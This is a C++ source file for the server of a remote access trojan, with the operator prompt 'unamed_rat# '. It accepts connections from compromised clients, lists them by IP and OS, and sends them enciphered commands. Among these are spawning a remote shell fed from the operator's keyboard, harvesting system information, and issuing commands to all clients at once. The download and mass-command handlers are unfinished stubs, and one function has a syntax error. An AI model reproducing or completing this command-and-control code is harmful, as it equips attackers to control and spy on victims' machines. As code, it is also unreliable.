#include "Server.hpp"
#include "Misc.hpp"
#include "Commands.hpp"

void Server::mtxLock(){
	mtxMutex.lock();
}

void Server::mtxUnlock(){
	mtxMutex.unlock();
}

void Server::FreeClient(int iClientID){
	delete Clients[iClientID];
	Clients[iClientID] = nullptr;
	std::cout<<"memory released\n";
}

void Server::FreeAllClients(){
	int iCounter = 0;
	for(; iCounter<Max_Clients; iCounter++){
		FreeClient(iCounter);
	}
}

bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
	std::string cLocalName = "";
	char cRemoteFileNameCopy[261]; //MAX_PATH under windows is 260 chars
	strncpy(cRemoteFileNameCopy, strRemoteFileName.c_str(), 260); 
	char *tkToken = strtok(cRemoteFileNameCopy, Clients[iClientID]->strOS == "Windows" ? "\\" : "/");
	while(tkToken != nullptr){
		cLocalName = tkToken;
		tkToken = strtok(nullptr, Clients[iClientID]->strOS == "Windows" ? "\\" : "/");
	}
	std::time_t tTime = std::time(nullptr);
	cLocalName.append(std::asctime(std::localtime(&tTime)));
	Misc::strReplaceSingleChar(cLocalName, ':', '-')
	return true;
}
void Server::ParseClientCommand(std::string strCommand, int iClientID){
	std::vector<std::string> vcClientCommands;
	Misc::strSplit(strCommand, ' ', vcClientCommands, 10);
	if(vcClientCommands[0][0] == '!'){
		std::string strTmp = vcClientCommands[0].substr(1, vcClientCommands[0].size() -1);
		for(u_int iIt2 = 1; iIt2<vcClientCommands.size(); iIt2++){
			strTmp.append(1, ' ');
			strTmp.append(vcClientCommands[iIt2]);
		}
		system(strTmp.c_str());
		return;
	}
	if(vcClientCommands.size() > 0){
		if(vcClientCommands[0] == "shell"){
			if(vcClientCommands.size() == 3){
				if(vcClientCommands[1] == "-c"){
					mtxLock();
					Clients[iClientID]->isFlag = true;
					mtxUnlock();
					std::string strCommandLine = CommandCodes::cShell;
					strCommandLine.append(vcClientCommands[2]);
					if(ssSendBinary(Clients[iClientID]->sckSocket, strCommandLine.c_str()) > 0){
						//receive confirmation that program is spawned
						char *cConfirm = nullptr;
						if(ssRecvBinary(Clients[iClientID]->sckSocket, cConfirm, 4) > 0){
								if(strcmp(cConfirm, "1@1") == 0){
									//spawn thread to receive output from shell
									//spawn here
									isReadingShell = true;
									while(isReadingShell){
										std::string strShellInput = "";
										std::getline(std::cin, strShellInput);
										ssSendBinary(Clients[iClientID]->sckSocket, strShellInput.c_str());
									}
								} else {
									std::cout<<"Shell not spawned\n";
								}
						} else {
							std::cout<<"Unable to read response from client\n";
						}
					} else {
						std::cout<<"Unable to send command to client\n";
						error();
					}
					mtxLock();
					Clients[iClientID]->isFlag = false;
					mtxUnlock();
				}
			} else {
				std::cout<<"\n\tUse shell -c path_to_shell\n";
			}
			return;
		}
		if(vcClientCommands[0] == "info"){
			mtxLock();
			Clients[iClientID]->isFlag = true;
			mtxUnlock();	
			if(vcClientCommands.size() == 2){
				if(vcClientCommands[1] == "-b"){
					//basic information
					char *cBufferInfo = nullptr;
					if(ssSendBinary(Clients[iClientID]->sckSocket, CommandCodes::cReqBasicInfo) > 0){
						if(ssRecvBinary(Clients[iClientID]->sckSocket, cBufferInfo, 1024) > 0){
							//here parse info depending os linux/windows
							//Clients[iClientID]->strOS == "Linux" ? parseinfolinux : parseinfowindows''
						} else {
							std::cout<<"Unable to retrieve information from client\n";
							error();
						}
					} else {
						std::cout<<"Unable to send command to client\n";
						error();
					}
					delete[] cBufferInfo;
					cBufferInfo = nullptr;
				} else if(vcClientCommands[1] == "-f"){
					//full information
					char *cBufferFullInfo = nullptr;
					if(ssSendBinary(Clients[iClientID]->sckSocket, CommandCodes::cReqFullInfo) > 0){
						if(ssRecvBinary(Clients[iClientID]->sckSocket, cBufferFullInfo, 2048) > 0){
							//here parse full info depending wich os
							//Clients[iClientID]->strOS == "Linux" ? parsefullinfolinux : parsefullinfowindows
						} else {
							std::cout<<"Unable to retrieve information from client\n";
							error();
						}
					} else {
						std::cout<<"Unable to send command to client\n";
						error();
					}
					delete[] cBufferFullInfo;
					cBufferFullInfo = nullptr;
				}
			} else {
				std::cout<<"\n\tUse info -b (Basic)  -f (Full)\n";
			}
			mtxLock();
			Clients[iClientID]->isFlag = false;
			mtxUnlock();	
			return;
		}
		if(vcClientCommands[0] == "download"){
			if(vcClientCommands.size() == 3){
				if(vcClientCommands[1] == "-r"){
					mtxLock();
					Clients[iClientID]->isFlag = true;
					mtxUnlock();
					//procedure to download file
					mtxLock();
					Clients[iClientID]->isFlag = false;
					mtxUnlock();
				}
			}
			return;
		}
	}
}

void Server::ParseMassiveCommand(std::string strCommand){
	std::vector<std::string> vcMassiveCommands;
	Misc::strSplit(strCommand, ' ', vcMassiveCommands, 10);
	//process commands
}

int Server::ssSendStr(int sckSocket, const std::string& strMessage){
	std::string strTmp = txtCipher.strCipher(strMessage);
	int sBytes = strTmp.length();
	int iBytes = send(sckSocket, strTmp.c_str(), sBytes, 0);
	return iBytes;
}

int Server::ssRecvStr(int sckSocket, std::string& strOutput, int sBytes){
	char *tmpData = new char[sBytes+1];
	int iBytes = recv(sckSocket, tmpData, sBytes, 0);
	if(iBytes <= 0){
		return -1;
	}
	strOutput = txtCipher.strUnCipher(std::string(tmpData));
	delete[] tmpData;
	tmpData = nullptr;
	return iBytes;
}

int Server::ssSendBinary(int sckSocket, const char *cData){
	char *tmpData = nullptr;
	txtCipher.BinaryCipher(cData, tmpData);
	int uiDataLen = Misc::StrLen(tmpData);
	int iBytes = send(sckSocket, tmpData, uiDataLen, 0);
	delete[] tmpData;
	tmpData = nullptr;
	return iBytes;
}
	
//delete memory of cOutput after use
int Server::ssRecvBinary(int sckSocket, char*& cOutput, int sBytes){
	char *cBuffer = new char[sBytes];
	if(cBuffer == nullptr){
		return -1;
	}
	int iBytes = recv(sckSocket, cBuffer, sBytes, 0);
	if(iBytes <=0){
		delete[] cBuffer;
		cBuffer = nullptr;
		return -1;
	}
	cOutput = txtCipher.BinaryUnCipher((const char *)cBuffer);
	delete[] cBuffer;
	cBuffer = nullptr;
	return iBytes;
}

bool Server::Listen(u_int uiMaxq){
	int iStat = 0, iYes = 1;
	const char *cLocalPort = std::string(std::to_string(uiLocalPort)).c_str();
	struct addrinfo strctAd, *strctP, *strctServer;
	memset(&strctAd, 0, sizeof(strctAd));
	strctAd.ai_family = AF_UNSPEC;
	strctAd.ai_socktype = SOCK_STREAM;
	strctAd.ai_flags = AI_PASSIVE;
	if((iStat = getaddrinfo(nullptr, cLocalPort, &strctAd, &strctServer)) != 0){
		std::cout<<"Error getaddrinfo\n";
		error();
		return false;
	}
	for(strctP = strctServer; strctP != nullptr; strctP = strctP->ai_next){
		if((sckMainSocket = socket(strctP->ai_family, strctP->ai_socktype, strctP->ai_protocol)) == -1){
			continue;
		}
		if(setsockopt(sckMainSocket, SOL_SOCKET, SO_REUSEADDR, &iYes, sizeof(int)) == -1){
			std::cout<<"setsockopt error\n";
			error();
			return false;
		}
		if(bind(sckMainSocket, strctP->ai_addr, strctP->ai_addrlen) == -1){
			continue;
		}
		//if reach here everything success
		fcntl(sckMainSocket, F_SETFL, O_NONBLOCK);
		break;
	}
	freeaddrinfo(strctServer);
	if(listen(sckMainSocket, uiMaxq) == -1){
		std::cout<<"Error listening\n";
		error();
		return false;
	}
	if(sckMainSocket == -1 || strctP == nullptr){
		return false;
	}
	return true;
}
		
int Server::WaitConnection(char*& output){
	char strIP[INET6_ADDRSTRLEN];
	int sckTmpSocket;
	struct sockaddr_storage strctClient;
	socklen_t slC = sizeof(strctClient);
	sckTmpSocket = accept(sckMainSocket, (struct sockaddr *)&strctClient, &slC);
	if(sckTmpSocket != -1){
		//beej guide network programming
		inet_ntop(strctClient.ss_family, get_int_addr((struct sockaddr *)&strctClient),strIP, sizeof(strIP));
	
		int sLen = Misc::StrLen(strIP);
		output = new char[sLen+1];
		strncpy(output, strIP, sLen);
	}
	return sckTmpSocket;
}

void Server::thStartHandler(){
	isReceiveThread = true;
	isCmdThread = true;
	std::thread t1(threadListener, std::ref(*this));
	std::thread t2(threadMasterCMD, std::ref(*this));
	std::thread t3(threadClientPing, std::ref(*this));
	t1.join();
	t2.join();
	t3.join();
}

//handle incomming connections
void threadListener(Server& srvTMP){
	//std::cout<<"Listener thread started\n";
	int iClientCount = 0, uiOldValue = 0;
	bool uiReachMax = false;
	while(srvTMP.isReceiveThread){  //receiver loop
		//if reach max connections loop until one disconects
		usleep(100000); //prevent 100% cpu usage 100 miliseconds
		if(iClientCount >= Max_Clients){
			uiReachMax = true;
			uiOldValue = iClientCount;
			bool isAvailable = false;
			int uiIt = 0;
			for(; uiIt<Max_Clients; uiIt++){
				if(srvTMP.Clients[uiIt] == nullptr){
					//found a spot
					iClientCount =  uiIt;
					isAvailable = true;
					break;
				}
			}
			if(!isAvailable){ continue; }
		}
		char *strTMPip = nullptr;
		int sckTMP = srvTMP.WaitConnection(strTMPip);
		if(sckTMP != -1){
			srvTMP.Clients[iClientCount] = new Client_Struct;
			if(srvTMP.Clients[iClientCount] == nullptr){
				std::cout<<"Error allocating memory for new client\n";
				error();
				continue;
			}
			srvTMP.Clients[iClientCount]->sckSocket = dup(sckTMP);
			
			//request os to client
			//implement when client its created
			/*int iBytes = srvTMP.ssSendBinary(srvTMP.Clients[iClientCount]->sckSocket, CommandCodes::cReqOS);
			if(iBytes > 0){
				char *strTmpBuffer = nullptr;
				iBytes = srvTMP.ssRecvBinary(srvTMP.Clients[iClientCount]->sckSocket, strTmpBuffer, 2);
				if(iBytes > 0 && Misc::StrLen(strTmpBuffer) >  0){
					srvTMP.Clients[iClientCount]->strOS = strTmpBuffer;
				} else {
					srvTMP.Clients[iClientCount]->strOS = "unkn0w";
				}
				delete[] strTmpBuffer;
				strTmpBuffer = nullptr;
			}*/
			srvTMP.Clients[iClientCount]->strOS = "unkn0w";

			//save obtained ip on client struct
			if(strTMPip != nullptr){
				srvTMP.Clients[iClientCount]->strIP = strTMPip;
				delete[] strTMPip;
				strTMPip = nullptr; 
			}
			
			srvTMP.mtxLock();
			srvTMP.Clients[iClientCount]->iID = iClientCount;
			srvTMP.Clients[iClientCount]->isConnected = true;
			srvTMP.Clients[iClientCount]->isFlag = false;
			srvTMP.iClientsOnline++;
			srvTMP.mtxUnlock();
			
			if(uiReachMax){
				iClientCount = uiOldValue;
			} else {
				iClientCount++;
			}
		} else {
			//check if memory was allocated for strTMPip
			if(strTMPip != nullptr){
				delete[] strTMPip;
				strTMPip = nullptr;
			}
		}
		
	}
	std::cout<<"end thread listener\n";
}

//here parse all commands from stdin
void threadMasterCMD(Server& srvTMP){
	std::string strPrompt = "unamed_rat# ";
	while(1){
		std::string strCMD;
		std::cout<<strPrompt;
		std::getline(std::cin, strCMD);
		if(strCMD.length() <= 1){
			continue;
		}
		std::vector<std::string> vcCommands;
		Misc::strSplit(strCMD, ' ', vcCommands, 10);
		//interact with clients
		if(vcCommands[0] == "cli"){
			if(vcCommands.size() == 5){ //cli -c id -a action
				int iClientId = 0;
				std::string strAction = "";
				for(u_int iIt2 = 1; iIt2<5; iIt2+=2){ //parse command line arguments
					if(vcCommands[iIt2] == "-c"){
						iClientId = Misc::StrToUint(vcCommands[iIt2+1].c_str());
						continue;
					}
					if(vcCommands[iIt2] == "-a"){
						strAction = vcCommands[iIt2+1];
					}
				}
				if(srvTMP.Clients[iClientId] != nullptr && srvTMP.Clients[iClientId]->isConnected){
					if(strAction == "interact"){
						//spawn prompt to interact with specified client
						std::string strClientCmd = "";
						std::string strPrompt = std::to_string(srvTMP.Clients[iClientId]->iID) + srvTMP.Clients[iClientId]->strIP + "@" + srvTMP.Clients[iClientId]->strOS + "#";
						do{
							std::cout<<strPrompt;
							std::getline(std::cin, strClientCmd);
							srvTMP.ParseClientCommand(strClientCmd, iClientId);
						}while(strClientCmd != "exit");
					}else if(strAction == "close"){ //close client conenction
 						if(srvTMP.Clients[iClientId] != nullptr && srvTMP.Clients[iClientId]->isConnected){
							if((srvTMP.ssSendBinary(srvTMP.Clients[iClientId]->sckSocket,CommandCodes::cClose)) > 0){
								close(srvTMP.Clients[iClientId]->sckSocket);
							} else {
								std::cout<<"Unable to send close command\n";
								error();
							}
						} else {
							std::cout<<"Client ["<<iClientId<<"] doesn't exist or is not connected anymore\n";
						}	
					}
				} else {
					std::cout<<"Client ["<<iClientId<<"] doesn't exist or is not connected anymore\n";
				}
				continue;
			}
			if(vcCommands.size() == 3){ //cli -c * massive command
				if(vcCommands[1] == "-c" && vcCommands[2] == "*"){
					std::string strMassiveCmd = "";
					do{
						std::cout<<"[ "<<srvTMP.iClientsOnline<<" ] online# ";
						std::getline(std::cin, strMassiveCmd);
						srvTMP.ParseMassiveCommand(strMassiveCmd);
					}while(strMassiveCmd != "exit");
				}
				continue;
			}
			if(vcCommands.size() == 2){ //cli -l
				if(vcCommands[1] == "-l"){
					//list connected clients
					if(srvTMP.iClientsOnline <= 0){
						std::cout<<"\n\tNo clients online\n";
						continue;
					}
					std::cout<<"\tClients online\n";
					for(u_int iIt2 = 0; iIt2<Max_Clients; iIt2++){
						if(srvTMP.Clients[iIt2] != nullptr){
							if(srvTMP.Clients[iIt2]->isConnected){
								std::cout<<"\t["<<srvTMP.Clients[iIt2]->iID<<"] "<<srvTMP.Clients[iIt2]->strIP<<" "<<srvTMP.Clients[iIt2]->strOS<<"\n";
							}
						}
					}
				}
			}
		}
		//help documentation goes here
		if(vcCommands[0] == "?"){
			std::cout<<"this is help, yes what else you was waiting for\n";
			continue;
		}
		//run shell command
		if(vcCommands[0][0] == '!'){
			std::string strShellCommand = vcCommands[0].substr(1, vcCommands[0].length()-1);
			for(u_int iIt2 = 1; iIt2<vcCommands.size(); iIt2++){
				strShellCommand.append(1, ' ');
				strShellCommand.append(vcCommands[iIt2]);
			}
			system(strShellCommand.c_str());
			continue;
		}
		//exit program
		if(vcCommands[0] == "exit"){
			std::cout<<"bye\n";
			break;
		}
	}
	//lock method
	srvTMP.isReceiveThread = false;
	srvTMP.isCmdThread = false;
	srvTMP.FreeAllClients();
	//unlock method
}

void threadClientPing(Server& srvTMP){
	//std::cout<<"Statrted ping\n";
	while(srvTMP.isCmdThread){
		usleep(100000); //prevent 100% cpu usage  100 miliseconds
		for(int iClientID = 0; iClientID<Max_Clients; iClientID++){
			if(srvTMP.Clients[iClientID] != nullptr && srvTMP.Clients[iClientID]->isConnected){
				if(srvTMP.Clients[iClientID]->isFlag){
					sleep(2);
					continue;
				} else {
					int iBytes = send(srvTMP.Clients[iClientID]->sckSocket, "", 1, 0);
					if(iBytes != 1){
						std::cout<<"Client["<<srvTMP.Clients[iClientID]->iID<<"] "<<srvTMP.Clients[iClientID]->strIP<<" disconnected\n";
						srvTMP.mtxLock();
						srvTMP.Clients[iClientID]->isConnected = false;
						srvTMP.iClientsOnline--;
						srvTMP.FreeClient(iClientID);
						srvTMP.mtxUnlock();
					}
					sleep(5);
				}
			}
		}
	}
}

//beej guide network programming
void *get_int_addr(struct sockaddr *sa){
	if(sa->sa_family == AF_INET){
		return &(((struct sockaddr_in*)sa)->sin_addr);
	}
	return &(((struct sockaddr_in6*)sa)->sin6_addr);
}
